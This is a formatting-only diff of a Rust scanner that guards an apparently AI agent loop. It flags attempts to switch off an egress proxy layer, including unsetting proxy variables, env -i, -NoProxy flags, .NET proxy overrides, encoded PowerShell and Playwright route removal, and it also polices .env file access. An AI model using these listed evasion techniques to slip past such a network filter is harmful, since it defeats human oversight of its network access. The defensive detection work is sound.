@@ -1176,13 +894,7 @@ fn read_script(ctx: &mut Ctx, path: &str) -> Option<String> {
     ctx.scanned.insert(absolute.clone());
     let meta = std::fs::metadata(&absolute).ok()?;
     if meta.len() > MAX_FILE_BYTES {
-        ctx.log.push((
-            "info".into(),
-            format!(
-                "script {} is over 1 MB: not scanned",
-                last_segment(&absolute)
-            ),
-        ));
+        ctx.log.push(("info".into(), format!("script {} is over 1 MB: not scanned", last_segment(&absolute))));
         return None;
     }
     let data = std::fs::read(&absolute).ok()?;
@@ -1194,71 +906,41 @@ fn read_script(ctx: &mut Ctx, path: &str) -> Option<String> {
 
 // ---- tamper -------------------------------------------------------------------------------------------------------------------------
 
-const PROXY_NAMES: [&str; 7] = [
-    "HTTP_PROXY",
-    "HTTPS_PROXY",
-    "ALL_PROXY",
-    "NO_PROXY",
-    "FTP_PROXY",
-    "NODE_USE_ENV_PROXY",
-    "LOOP_NETWORK_ALLOW_FILE",
-];
+const PROXY_NAMES: [&str; 7] = ["HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "NO_PROXY", "FTP_PROXY", "NODE_USE_ENV_PROXY", "LOOP_NETWORK_ALLOW_FILE"];
 const APPEND_NAMES: [&str; 2] = ["PYTHONPATH", "NODE_OPTIONS"];
 
 fn protected_names() -> Vec<&'static str> {
-    PROXY_NAMES
-        .iter()
-        .chain(APPEND_NAMES.iter())
-        .copied()
-        .collect()
+    PROXY_NAMES.iter().chain(APPEND_NAMES.iter()).copied().collect()
 }
 
 fn names_alt() -> String {
     protected_names().join("|")
 }
 
-static ASSIGN_RE: LazyLock<Re> = LazyLock::new(|| {
-    Re::ci(&format!(
-        r"(?<![\w.\-])(?:\$\{{?env:|env:)?({})\}}?(\s*\+?=)(?!=)\s*([^\s;]*)",
-        names_alt()
-    ))
-});
+static ASSIGN_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(&format!(r"(?<![\w.\-])(?:\$\{{?env:|env:)?({})\}}?(\s*\+?=)(?!=)\s*([^\s;]*)", names_alt())));
 static SET_ITEM_RE: LazyLock<Re> = LazyLock::new(|| {
     Re::ci(&format!(
         r"(?<![\w-])(?:Remove-Item|ri|rm|del|erase|rd|Set-Item|si|Clear-Item|cli|New-Item|ni|Set-Content|sc|Add-Content|ac|Rename-Item|rni|Copy-Item|cpi|Move-Item|mi|Set-ItemProperty|sp)\b[^\n;|]*?\bEnv:\\?\s*(?:{})\b",
         names_alt()
     ))
 });
-static SET_ENV_API_RE: LazyLock<Re> = LazyLock::new(|| {
-    Re::ci(&format!(
-        r#"SetEnvironmentVariable\s*\(\s*['"](?:{n})['"]|(?<![\w-])setx\s+(?:/\w\s+)*['"]?(?:{n})\b"#,
-        n = names_alt()
-    ))
-});
+static SET_ENV_API_RE: LazyLock<Re> =
+    LazyLock::new(|| Re::ci(&format!(r#"SetEnvironmentVariable\s*\(\s*['"](?:{n})['"]|(?<![\w-])setx\s+(?:/\w\s+)*['"]?(?:{n})\b"#, n = names_alt())));
 static DEFAULT_PROXY_RE: LazyLock<Re> = LazyLock::new(|| {
     Re::ci(
         r"\[\s*(?:System\.)?Net\.WebRequest\s*\]\s*::\s*(?:DefaultWebProxy\s*=|set_DefaultWebProxy)|\[\s*(?:System\.)?Net\.Http\.HttpClient\s*\]\s*::\s*(?:DefaultProxy\s*=|set_DefaultProxy)|\[\s*(?:System\.)?Net\.WebRequest\s*\]\s*::\s*DefaultWebProxy\s*\.\s*\w+\s*=",
     )
 });
-static NO_PROXY_FLAG_RE: LazyLock<Re> =
-    LazyLock::new(|| Re::ci(r"(?<![\w-])-NoProxy\b|(?<![\w-])--no-?proxy\b"));
-static BODY_ENV_RE: LazyLock<Re> = LazyLock::new(|| {
-    Re::ci(&format!(
-        r"(?:environ|process\.env|putenv|unsetenv|setenv|Deno\.env)[^\n]{{0,100}}?(?<![\w])(?:{})(?![\w])",
-        names_alt()
-    ))
-});
+static NO_PROXY_FLAG_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"(?<![\w-])-NoProxy\b|(?<![\w-])--no-?proxy\b"));
+static BODY_ENV_RE: LazyLock<Re> =
+    LazyLock::new(|| Re::ci(&format!(r"(?:environ|process\.env|putenv|unsetenv|setenv|Deno\.env)[^\n]{{0,100}}?(?<![\w])(?:{})(?![\w])", names_alt())));
 static NODE_SKIP_RE: LazyLock<Re> = LazyLock::new(|| Re::new(r"^--no-experimental-\S+\z"));
 
 fn tamper_text_hits(ctx: &mut Ctx, text: &str, in_body: bool) {
     for m in ASSIGN_RE.find_all(text) {
         let name = m.group(1).unwrap_or("").to_uppercase();
         let op = m.group(2).unwrap_or("").trim().to_string();
-        let value = m
-            .group(3)
-            .unwrap_or("")
-            .trim_matches(|c| c == '"' || c == '\'')
-            .to_string();
+        let value = m.group(3).unwrap_or("").trim_matches(|c| c == '"' || c == '\'').to_string();
         if APPEND_NAMES.contains(&name.as_str()) {
             let own = Re::ci(&format!(r"^(?:\$\{{?(?:env:)?{n}\}}?|%{n}%)", n = name));
             if op == "+=" || own.match_start(&value).is_some() {
@@ -1268,22 +950,10 @@ fn tamper_text_hits(ctx: &mut Ctx, text: &str, in_body: bool) {
         ctx.hit("egress-tamper", &format!("setting {name} would switch the loop's run-time egress layer off; the loop sets it, never the command"));
     }
     let checks: [(&Re, &str); 4] = [
-        (
-            &SET_ITEM_RE,
-            "changing an Env: variable of the run-time egress layer",
-        ),
-        (
-            &SET_ENV_API_RE,
-            "SetEnvironmentVariable/setx on a variable of the run-time egress layer",
-        ),
-        (
-            &DEFAULT_PROXY_RE,
-            "assigning a .NET default proxy replaces the loop's egress proxy",
-        ),
-        (
-            &NO_PROXY_FLAG_RE,
-            "-NoProxy/--noproxy skips the loop's egress proxy",
-        ),
+        (&SET_ITEM_RE, "changing an Env: variable of the run-time egress layer"),
+        (&SET_ENV_API_RE, "SetEnvironmentVariable/setx on a variable of the run-time egress layer"),
+        (&DEFAULT_PROXY_RE, "assigning a .NET default proxy replaces the loop's egress proxy"),
+        (&NO_PROXY_FLAG_RE, "-NoProxy/--noproxy skips the loop's egress proxy"),
     ];
     for (pattern, why) in checks {
         if pattern.is_match(text) {
@@ -1291,10 +961,7 @@ fn tamper_text_hits(ctx: &mut Ctx, text: &str, in_body: bool) {
         }
     }
     if in_body && BODY_ENV_RE.is_match(text) {
-        ctx.hit(
-            "egress-tamper",
-            "inline code that touches a proxy or preload variable of the run-time egress layer",
-        );
+        ctx.hit("egress-tamper", "inline code that touches a proxy or preload variable of the run-time egress layer");
     }
 }
 
@@ -1302,18 +969,9 @@ fn tamper_word_hits(ctx: &mut Ctx, name: &str, args: &[String]) {
     let upper: Vec<String> = args.iter().map(|a| a.to_uppercase()).collect();
     let prot = protected_names();
     if name == "unset" && upper.iter().any(|a| prot.contains(&a.as_str())) {
-        ctx.hit(
-            "egress-tamper",
-            "unset of a variable of the run-time egress layer",
-        );
-    } else if name == "export"
-        && args.iter().any(|a| a == "-n")
-        && upper.iter().any(|a| prot.contains(&a.as_str()))
-    {
-        ctx.hit(
-            "egress-tamper",
-            "export -n of a variable of the run-time egress layer",
-        );
+        ctx.hit("egress-tamper", "unset of a variable of the run-time egress layer");
+    } else if name == "export" && args.iter().any(|a| a == "-n") && upper.iter().any(|a| prot.contains(&a.as_str())) {
+        ctx.hit("egress-tamper", "export -n of a variable of the run-time egress layer");
     } else if name == "env" {
         static CLUSTER_I: LazyLock<Re> = LazyLock::new(|| Re::new(r"^-[A-Za-z]*i[A-Za-z]*\z"));
         let mut index = 0;
@@ -1321,15 +979,8 @@ fn tamper_word_hits(ctx: &mut Ctx, name: &str, args: &[String]) {
             let option = args[index].clone();
             index += 1;
             let mut value: Option<String> = None;
-            if option == "-i"
-                || option == "-"
-                || option == "--ignore-environment"
-                || CLUSTER_I.is_match(&option)
-            {
-                ctx.hit(
-                    "egress-tamper",
-                    "env -i clears the environment, proxy variables and preloads included",
-                );
+            if option == "-i" || option == "-" || option == "--ignore-environment" || CLUSTER_I.is_match(&option) {
+                ctx.hit("egress-tamper", "env -i clears the environment, proxy variables and preloads included");
             } else if option == "-u" || option == "--unset" {
                 value = Some(args.get(index).cloned().unwrap_or_default());
                 index += 1;
@@ -1340,10 +991,7 @@ fn tamper_word_hits(ctx: &mut Ctx, name: &str, args: &[String]) {
             }
             if let Some(v) = value {
                 if prot.contains(&v.to_uppercase().as_str()) {
-                    ctx.hit(
-                        "egress-tamper",
-                        "env -u of a variable of the run-time egress layer",
-                    );
+                    ctx.hit("egress-tamper", "env -u of a variable of the run-time egress layer");
                 }
             }
         }
@@ -1352,22 +1000,15 @@ fn tamper_word_hits(ctx: &mut Ctx, name: &str, args: &[String]) {
 
 // ---- interpreters --------------------------------------------------------------------------------------------------------------------
 
-static PYTHON_RE: LazyLock<Re> =
-    LazyLock::new(|| Re::ci(r"^(?:py|pythonw?|python\d[\d.]*|pypy\d*)\z"));
+static PYTHON_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^(?:py|pythonw?|python\d[\d.]*|pypy\d*)\z"));
 static NODE_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^(?:node|nodejs)\z"));
 static TS_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^(?:tsx|ts-node|ts-node-esm|bun|deno)\z"));
 static SHELL_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^(?:bash|sh|zsh|dash|ksh)\z"));
 static POWERSHELL_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^(?:pwsh|powershell)\z"));
-const EXTRA_LAUNCHERS: [&str; 10] = [
-    "npx", "bunx", "pnpm", "yarn", "npm", "uvx", "uv", "pipx", "poetry", "pdm",
-];
-static PS_COMMAND_RE: LazyLock<Re> =
-    LazyLock::new(|| Re::ci(r"^-c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?\z"));
-static PS_ENCODED_RE: LazyLock<Re> = LazyLock::new(|| {
-    Re::ci(
-        r"^-e(?:c|nc|nco|ncod|ncode|ncoded|ncodedc|ncodedco|ncodedcom|ncodedcomm|ncodedcomma|ncodedcomman|ncodedcommand)?\z",
-    )
-});
+const EXTRA_LAUNCHERS: [&str; 10] = ["npx", "bunx", "pnpm", "yarn", "npm", "uvx", "uv", "pipx", "poetry", "pdm"];
+static PS_COMMAND_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^-c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?\z"));
+static PS_ENCODED_RE: LazyLock<Re> =
+    LazyLock::new(|| Re::ci(r"^-e(?:c|nc|nco|ncod|ncode|ncoded|ncodedc|ncodedco|ncodedcom|ncodedcomm|ncodedcomma|ncodedcomman|ncodedcommand)?\z"));
 static PS_FILE_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^-f(?:i(?:l(?:e)?)?)?\z"));
 
 fn program_starts(words: &[String]) -> Vec<usize> {
@@ -1408,11 +1049,7 @@ fn python_parts(ctx: &mut Ctx, args: &[String]) -> (Vec<String>, bool, Vec<Strin
                 }
                 if *letter == 'c' {
                     let tail: String = letters[position + 1..].iter().collect();
-                    let body = if !tail.is_empty() {
-                        tail
-                    } else {
-                        args.get(index).cloned().unwrap_or_default()
-                    };
+                    let body = if !tail.is_empty() { tail } else { args.get(index).cloned().unwrap_or_default() };
                     bodies.push(body);
                     return (bodies, stdin, files);
                 }
@@ -1439,14 +1076,9 @@ fn node_parts(ctx: &mut Ctx, args: &[String]) -> (Vec<String>, bool) {
         let word = &args[index];
         index += 1;
         if NODE_SKIP_RE.is_match(word) {
-            ctx.hit(
-                "egress-tamper",
-                &format!("node {word} changes how the preloaded egress filter is loaded"),
-            );
+            ctx.hit("egress-tamper", &format!("node {word} changes how the preloaded egress filter is loaded"));
         }
-        if ["-e", "--eval", "-p", "--print", "-pe", "-ep"].contains(&word.as_str())
-            && index < args.len()
-        {
+        if ["-e", "--eval", "-p", "--print", "-pe", "-ep"].contains(&word.as_str()) && index < args.len() {
             bodies.push(args[index].clone());
             index += 1;
         } else if let Some(rest) = word.strip_prefix("--eval=") {
@@ -1476,25 +1108,16 @@ fn powershell_parts(ctx: &mut Ctx, args: &[String]) -> (Vec<String>, bool, Vec<S
             break;
         }
         if PS_ENCODED_RE.is_match(word) && index < args.len() {
-            let decoded = base64::engine::general_purpose::STANDARD
-                .decode(args[index].as_bytes())
-                .ok()
-                .and_then(|bytes| {
-                    if bytes.len() % 2 != 0 {
-                        return None;
-                    }
-                    let units: Vec<u16> = bytes
-                        .chunks(2)
-                        .map(|c| u16::from_le_bytes([c[0], c[1]]))
-                        .collect();
-                    String::from_utf16(&units).ok()
-                });
+            let decoded = base64::engine::general_purpose::STANDARD.decode(args[index].as_bytes()).ok().and_then(|bytes| {
+                if bytes.len() % 2 != 0 {
+                    return None;
+                }
+                let units: Vec<u16> = bytes.chunks(2).map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
+                String::from_utf16(&units).ok()
+            });
             match decoded {
                 Some(text) => bodies.push(text),
-                None => ctx.unprovable(
-                    "powershell -EncodedCommand",
-                    "the encoded command cannot be decoded, so what it reaches cannot be proven",
-                ),
+                None => ctx.unprovable("powershell -EncodedCommand", "the encoded command cannot be decoded, so what it reaches cannot be proven"),
             }
             break;
         }
@@ -1512,35 +1135,18 @@ fn powershell_parts(ctx: &mut Ctx, args: &[String]) -> (Vec<String>, bool, Vec<S
 fn scan_files(ctx: &mut Ctx, candidates: &[String], raw: &str, cred_forced: bool) {
     static WRITER: LazyLock<Re> = LazyLock::new(|| Re::new(r"<<|>|\btee\b|Set-Content|Out-File"));
     for word in candidates {
-        if !SCRIPT_EXT_RE.is_match(word)
-            || word.starts_with('-')
-            || last_segment(word).to_lowercase() == "testenv.py"
-        {
+        if !SCRIPT_EXT_RE.is_match(word) || word.starts_with('-') || last_segment(word).to_lowercase() == "testenv.py" {
             continue;
         }
         match read_script(ctx, word) {
             Some(text) => {
-                literal_hits(
-                    ctx,
-                    &text,
-                    "egress-host",
-                    cred_forced,
-                    &format!("script {}", last_segment(word)),
-                    true,
-                );
+                literal_hits(ctx, &text, "egress-host", cred_forced, &format!("script {}", last_segment(word)), true);
             }
             None => {
                 let expanded = ctx.expand(word);
                 let absolute = ctx.normalize(&expanded, Some(&ctx.cwd.clone()));
                 if !std::path::Path::new(&absolute).is_file() && WRITER.is_match(raw) {
-                    literal_hits(
-                        ctx,
-                        raw,
-                        "egress-host",
-                        cred_forced,
-                        &format!("command text (script {} not found)", last_segment(word)),
-                        true,
-                    );
+                    literal_hits(ctx, raw, "egress-host", cred_forced, &format!("command text (script {} not found)", last_segment(word)), true);
                 }
             }
         }
@@ -1555,51 +1161,25 @@ fn interpreter(ctx: &mut Ctx, name: &str, args: &[String], raw: &str, cred_force
         let (b, s, f) = python_parts(ctx, args);
         bodies = b;
         stdin = s;
-        files = if f.is_empty() {
-            args.iter()
-                .filter(|w| SCRIPT_EXT_RE.is_match(w))
-                .cloned()
-                .collect()
-        } else {
-            f
-        };
+        files = if f.is_empty() { args.iter().filter(|w| SCRIPT_EXT_RE.is_match(w)).cloned().collect() } else { f };
     } else if NODE_RE.is_match(name) {
         let (b, s) = node_parts(ctx, args);
         bodies = b;
         stdin = s;
     } else if name == "deno" && args.first().is_some_and(|a| a == "eval") {
-        bodies = args[1..]
-            .iter()
-            .filter(|w| !w.starts_with('-'))
-            .cloned()
-            .collect();
+        bodies = args[1..].iter().filter(|w| !w.starts_with('-')).cloned().collect();
     } else if POWERSHELL_RE.is_match(name) {
         let (b, s, f) = powershell_parts(ctx, args);
         bodies = b;
         stdin = s;
-        files = if f.is_empty() {
-            args.iter()
-                .filter(|w| SCRIPT_EXT_RE.is_match(w))
-                .cloned()
-                .collect()
-        } else {
-            f
-        };
+        files = if f.is_empty() { args.iter().filter(|w| SCRIPT_EXT_RE.is_match(w)).cloned().collect() } else { f };
     }
     for body in &bodies {
         literal_hits(ctx, body, "egress-host", cred_forced, "inline code", true);
         tamper_text_hits(ctx, body, true);
     }
-    if stdin && (PYTHON_RE.is_match(name) || NODE_RE.is_match(name) || POWERSHELL_RE.is_match(name))
-    {
-        literal_hits(
-            ctx,
-            raw,
-            "egress-host",
-            cred_forced,
-            "script from stdin",
-            true,
-        );
+    if stdin && (PYTHON_RE.is_match(name) || NODE_RE.is_match(name) || POWERSHELL_RE.is_match(name)) {
+        literal_hits(ctx, raw, "egress-host", cred_forced, "script from stdin", true);
         tamper_text_hits(ctx, raw, true);
     }
     scan_files(ctx, &files, raw, cred_forced);
@@ -1617,12 +1197,7 @@ fn interpreter(ctx: &mut Ctx, name: &str, args: &[String], raw: &str, cred_force
 
 fn testenv_inner(words: &[String]) -> Option<String> {
     for (position, word) in words.iter().enumerate() {
-        let tail = word
-            .trim_matches(|c| c == '"' || c == '\'')
-            .rsplit(['\\', '/'])
-            .next()
-            .unwrap_or("")
-            .to_lowercase();
+        let tail = word.trim_matches(|c| c == '"' || c == '\'').rsplit(['\\', '/']).next().unwrap_or("").to_lowercase();
         if tail != "testenv.py" && tail != "testenv" && tail != "craft" && tail != "craft.exe" {
             continue;
         }
@@ -1635,45 +1210,26 @@ fn testenv_inner(words: &[String]) -> Option<String> {
             index += 1;
         }
         while index < words.len() && words[index].starts_with('-') {
-            index += if words[index] == "--project" || words[index] == "--names" {
-                2
-            } else {
-                1
-            };
+            index += if words[index] == "--project" || words[index] == "--names" { 2 } else { 1 };
         }
         if index < words.len() && words[index] == "exec" {
-            return Some(if words.len() > index + 2 {
-                join_words(&words[index + 1..])
-            } else {
-                words.get(index + 1).cloned().unwrap_or_default()
-            });
+            return Some(if words.len() > index + 2 { join_words(&words[index + 1..]) } else { words.get(index + 1).cloned().unwrap_or_default() });
         }
     }
     None
 }
 
 fn uses_secret(inner: &str) -> bool {
-    VARIABLE_RE
-        .find_all(inner)
-        .into_iter()
-        .map(|m| (1..=4).find_map(|i| m.group(i)).unwrap_or("").to_string())
-        .any(|n| SECRET_NAME.is_match(&n))
+    VARIABLE_RE.find_all(inner).into_iter().map(|m| (1..=4).find_map(|i| m.group(i)).unwrap_or("").to_string()).any(|n| SECRET_NAME.is_match(&n))
 }
 
 const FILTER_RELATIVE: &str = ".specs/project/loop/internal/network-filter.js";
-static ROUTE_CODE_RE: LazyLock<Re> = LazyLock::new(|| {
-    Re::ci(r#"unroute|\.\s*route\s*[(\[]|routeFromHAR|routeWebSocket|\[\s*['"`]\s*(?:un)?route"#)
-});
+static ROUTE_CODE_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r#"unroute|\.\s*route\s*[(\[]|routeFromHAR|routeWebSocket|\[\s*['"`]\s*(?:un)?route"#));
 
 fn playwright(ctx: &mut Ctx, args: &[String], cred_forced: bool) {
     let lowered: Vec<String> = args.iter().map(|a| a.to_lowercase()).collect();
-    if lowered.iter().any(|a| {
-        a == "route" || a == "route-remove" || a == "route-list" || a.starts_with("unroute")
-    }) {
-        ctx.hit(
-            "egress-tamper",
-            "playwright-cli route/unroute/route-remove would change the loop's network filter",
-        );
+    if lowered.iter().any(|a| a == "route" || a == "route-remove" || a == "route-list" || a.starts_with("unroute")) {
+        ctx.hit("egress-tamper", "playwright-cli route/unroute/route-remove would change the loop's network filter");
         return;
     }
     if let Some(pos) = lowered.iter().position(|a| a == "run-code") {
@@ -1696,10 +1252,7 @@ fn playwright(ctx: &mut Ctx, args: &[String], cred_forced: bool) {
             let expanded = ctx.expand(&file);
             let absolute = ctx.normalize(&expanded, Some(&ctx.cwd.clone()));
             let roots = ctx.roots.clone();
-            if roots.iter().any(|root| {
-                absolute == format!("{root}/{}", FILTER_RELATIVE.to_lowercase())
-                    || absolute == format!("{root}/{FILTER_RELATIVE}")
-            }) {
+            if roots.iter().any(|root| absolute == format!("{root}/{}", FILTER_RELATIVE.to_lowercase()) || absolute == format!("{root}/{FILTER_RELATIVE}")) {
                 return;
             }
             match read_script(ctx, &file) {
@@ -1724,11 +1277,7 @@ fn playwright(ctx: &mut Ctx, args: &[String], cred_forced: bool) {
     for (position, word) in lowered.iter().enumerate() {
         if ["open", "goto", "tab-new"].contains(&word.as_str()) {
             for target in &args[position + 1..] {
-                let target = if target.to_lowercase().starts_with("--url=") {
-                    partition(target, "=").2.to_string()
-                } else {
-                    target.clone()
-                };
+                let target = if target.to_lowercase().starts_with("--url=") { partition(target, "=").2.to_string() } else { target.clone() };
                 static HOSTISH: LazyLock<Re> = LazyLock::new(|| Re::new(r"[.:$%]|^localhost"));
                 if target.starts_with('-') || !HOSTISH.is_match(&target) {
                     continue;
@@ -1768,12 +1317,7 @@ fn scan_words(ctx: &mut Ctx, words: &[String], raw: &str, cred_forced: bool, dep
         } else if name == "source" || name == "." {
             let first: Vec<String> = args.iter().take(1).cloned().collect();
             scan_files(ctx, &first, raw, cred_forced);
-        } else if PYTHON_RE.is_match(&name)
-            || NODE_RE.is_match(&name)
-            || TS_RE.is_match(&name)
-            || POWERSHELL_RE.is_match(&name)
-            || SHELL_RE.is_match(&name)
-        {
+        } else if PYTHON_RE.is_match(&name) || NODE_RE.is_match(&name) || TS_RE.is_match(&name) || POWERSHELL_RE.is_match(&name) || SHELL_RE.is_match(&name) {
             interpreter(ctx, &name, &args, raw, cred_forced);
         } else if SCRIPT_EXT_RE.is_match(&words[start]) {
             scan_files(ctx, &[words[start].clone()], raw, cred_forced);
@@ -1782,22 +1326,7 @@ fn scan_words(ctx: &mut Ctx, words: &[String], raw: &str, cred_forced: bool, dep
 }
 
 fn is_printer(name: &str) -> bool {
-    matches!(
-        name,
-        "echo"
-            | "printf"
-            | "write-output"
-            | "write-host"
-            | "grep"
-            | "egrep"
-            | "fgrep"
-            | "rg"
-            | "ag"
-            | "ack"
-            | "select-string"
-            | "sls"
-            | "findstr"
-    )
+    matches!(name, "echo" | "printf" | "write-output" | "write-host" | "grep" | "egrep" | "fgrep" | "rg" | "ag" | "ack" | "select-string" | "sls" | "findstr")
 }
 
 /// Index after the balanced open ... close group that starts at `index`.
@@ -1829,18 +1358,11 @@ pub fn scan_command(ctx: &mut Ctx, command: &str, cred_forced: bool, depth: usiz
                 continue;
             }
             scan_words(ctx, &words, command, cred_forced, depth);
-            let first = words
-                .iter()
-                .find(|w| !ASSIGNMENT.is_match(w))
-                .cloned()
-                .unwrap_or_default();
+            let first = words.iter().find(|w| !ASSIGNMENT.is_match(w)).cloned().unwrap_or_default();
             if !is_printer(&executable_name(&first)) {
                 continue;
             }
-            for word in words
-                .iter()
-                .filter(|w| w.trim().chars().any(char::is_whitespace))
-            {
+            for word in words.iter().filter(|w| w.trim().chars().any(char::is_whitespace)) {
                 if index < events.len() && events[index] == Event::Open {
                     let end = group_end(&events, index);
                     if !word.contains("$(") && !word.contains('`') {
@@ -1865,25 +1387,18 @@ pub fn command_hits(ctx: &mut Ctx, command: &str, rules: &[&str]) -> Vec<(String
         env_text_hits(ctx, command);
     }
     tamper_text_hits(ctx, command, false);
-    ctx.hits
-        .iter()
-        .filter(|(rule, _)| rules.contains(&rule.as_str()))
-        .cloned()
-        .collect()
+    ctx.hits.iter().filter(|(rule, _)| rules.contains(&rule.as_str())).cloned().collect()
 }
 
 // ---- .env files ------------------------------------------------------------------------------------------------------------------------
 
-static ENV_FILE_RE: LazyLock<Re> =
-    LazyLock::new(|| Re::ci(r"^\.env(?:\.[\w*?\[\]{}-]+)*[*?]?\n?\z"));
+static ENV_FILE_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^\.env(?:\.[\w*?\[\]{}-]+)*[*?]?\n?\z"));
 static TOKEN_SPLIT_RE: LazyLock<Re> = LazyLock::new(|| Re::new(r#"[\s"'`<>|;&(){},=]+"#));
 static VAR_CHARS: LazyLock<Re> = LazyLock::new(|| Re::new(r"[$%`]|\$\("));
 const PROJECT_ENV_TEST: &str = ".specs/project/.env.test";
 
 fn is_env_name(name: &str) -> bool {
-    ENV_FILE_RE.is_match(name)
-        && !["example", "sample", "template"]
-            .contains(&name.to_lowercase().rsplit('.').next().unwrap_or(""))
+    ENV_FILE_RE.is_match(name) && !["example", "sample", "template"].contains(&name.to_lowercase().rsplit('.').next().unwrap_or(""))
 }
 
 fn env_token_reason(ctx: &mut Ctx, token: &str, base: Option<&str>) -> String {
@@ -1930,17 +1445,7 @@ fn new_texts(tool_name: &str, input: &Value) -> Vec<Option<String>> {
         "MultiEdit" => input
             .get("edits")
             .and_then(Value::as_array)
-            .map(|edits| {
-                edits
-                    .iter()
-                    .filter(|e| e.is_object())
-                    .map(|e| {
-                        e.get("new_string")
-                            .and_then(Value::as_str)
-                            .map(String::from)
-                    })
-                    .collect()
-            })
+            .map(|edits| edits.iter().filter(|e| e.is_object()).map(|e| e.get("new_string").and_then(Value::as_str).map(String::from)).collect())
             .unwrap_or_default(),
         _ => vec![s("new_source")],
     }
@@ -1951,12 +1456,7 @@ fn content_hits(ctx: &mut Ctx, tool_name: &str, input: &Value) {
         .get("file_path")
         .and_then(Value::as_str)
         .filter(|s| !s.is_empty())
-        .or_else(|| {
-            input
-                .get("notebook_path")
-                .and_then(Value::as_str)
-                .filter(|s| !s.is_empty())
-        })
+        .or_else(|| input.get("notebook_path").and_then(Value::as_str).filter(|s| !s.is_empty()))
         .unwrap_or("")
         .to_string();
     if target.is_empty() {
@@ -1964,10 +1464,7 @@ fn content_hits(ctx: &mut Ctx, tool_name: &str, input: &Value) {
     }
     let expanded = ctx.expand(&target);
     let absolute = ctx.normalize(&expanded, Some(&ctx.cwd.clone()));
-    if !(ctx.inside(&absolute) || ctx.temp_folder(&absolute))
-        || format!("{absolute}/").contains("/.specs/")
-        || SKIP_CONTENT_RE.is_match(&absolute)
-    {
+    if !(ctx.inside(&absolute) || ctx.temp_folder(&absolute)) || format!("{absolute}/").contains("/.specs/") || SKIP_CONTENT_RE.is_match(&absolute) {
         return;
     }
     let name = last_segment(&absolute).to_string();
@@ -1976,10 +1473,7 @@ fn content_hits(ctx: &mut Ctx, tool_name: &str, input: &Value) {
             continue;
         }
         if text.len() as u64 > MAX_FILE_BYTES {
-            ctx.log.push((
-                "info".into(),
-                format!("content for {name} is over 1 MB: not scanned"),
-            ));
+            ctx.log.push(("info".into(), format!("content for {name} is over 1 MB: not scanned")));
             continue;
         }
         if ENV_FILE_RE.is_match(&name) {
@@ -1991,24 +1485,12 @@ fn content_hits(ctx: &mut Ctx, tool_name: &str, input: &Value) {
                 ctx.hit("egress-tamper", &format!("an .env file must not set {n}: it would switch the loop's run-time egress layer off"));
             }
         }
-        literal_hits(
-            ctx,
-            &text,
-            "egress-content",
-            false,
-            &format!("content for {name}"),
-            true,
-        );
+        literal_hits(ctx, &text, "egress-content", false, &format!("content for {name}"), true);
     }
 }
 
 /// `[(rule, reason)]` of a non-shell tool call for the network rules in `rules`.
-pub fn tool_hits(
-    ctx: &mut Ctx,
-    tool_name: &str,
-    input: &Value,
-    rules: &[&str],
-) -> Vec<(String, String)> {
+pub fn tool_hits(ctx: &mut Ctx, tool_name: &str, input: &Value, rules: &[&str]) -> Vec<(String, String)> {
     if !input.is_object() {
         return vec![];
     }
@@ -2026,16 +1508,10 @@ pub fn tool_hits(
     if WRITE_TOOLS.contains(&tool_name) && rules.contains(&"egress-content") {
         content_hits(ctx, tool_name, input);
     }
-    if rules.contains(&"env-file")
-        && (["Read", "Glob", "Grep"].contains(&tool_name) || WRITE_TOOLS.contains(&tool_name))
-    {
+    if rules.contains(&"env-file") && (["Read", "Glob", "Grep"].contains(&tool_name) || WRITE_TOOLS.contains(&tool_name)) {
         let base = input.get("path").and_then(Value::as_str).map(String::from);
         for key in ["file_path", "notebook_path", "path"] {
-            if let Some(value) = input
-                .get(key)
-                .and_then(Value::as_str)
-                .filter(|v| !v.is_empty())
-            {
+            if let Some(value) = input.get(key).and_then(Value::as_str).filter(|v| !v.is_empty()) {
                 let reason = env_token_reason(ctx, value, None);
                 if !reason.is_empty() {
                     ctx.hit("env-file", &reason);
@@ -2046,10 +1522,7 @@ pub fn tool_hits(
             let Some(value) = input.get(key).and_then(Value::as_str) else {
                 continue;
             };
-            if (tool_name == "Glob" || tool_name == "Grep")
-                && (key == "glob" || tool_name == "Glob")
-                && value.to_lowercase().contains(".env")
-            {
+            if (tool_name == "Glob" || tool_name == "Grep") && (key == "glob" || tool_name == "Glob") && value.to_lowercase().contains(".env") {
                 static ABS: LazyLock<Re> = LazyLock::new(|| Re::new(r"^(?:[a-zA-Z]:)?/"));
                 let folder = match &base {
                     Some(b) if !b.is_empty() => {
@@ -2057,23 +1530,14 @@ pub fn tool_hits(
                         ctx.normalize(&expanded, Some(&ctx.cwd.clone()))
                     }
                     _ => {
-                        let c = if ctx.cwd.is_empty() {
-                            ctx.root.clone()
-                        } else {
-                            ctx.cwd.clone()
-                        };
+                        let c = if ctx.cwd.is_empty() { ctx.root.clone() } else { ctx.cwd.clone() };
                         ctx.normalize(&c, None)
                     }
                 };
                 let reason = if ABS.is_match(&value.replace('\\', "/")) {
                     env_token_reason(ctx, value, None)
                 } else if !ctx.inside(&folder) {
-                    let shown: String = base
-                        .clone()
-                        .unwrap_or_else(|| folder.clone())
-                        .chars()
-                        .take(80)
-                        .collect();
+                    let shown: String = base.clone().unwrap_or_else(|| folder.clone()).chars().take(80).collect();
                     format!(".env search outside the project ({shown}): in the loop only .env files inside the project root may be read")
                 } else {
                     String::new()
@@ -2084,11 +1548,7 @@ pub fn tool_hits(
             }
         }
     }
-    ctx.hits
-        .iter()
-        .filter(|(rule, _)| rules.contains(&rule.as_str()))
-        .cloned()
-        .collect()
+    ctx.hits.iter().filter(|(rule, _)| rules.contains(&rule.as_str())).cloned().collect()
 }
 
 // ---- run-time layer: the variables of the agent's commands ---------------------------------------------------------------------
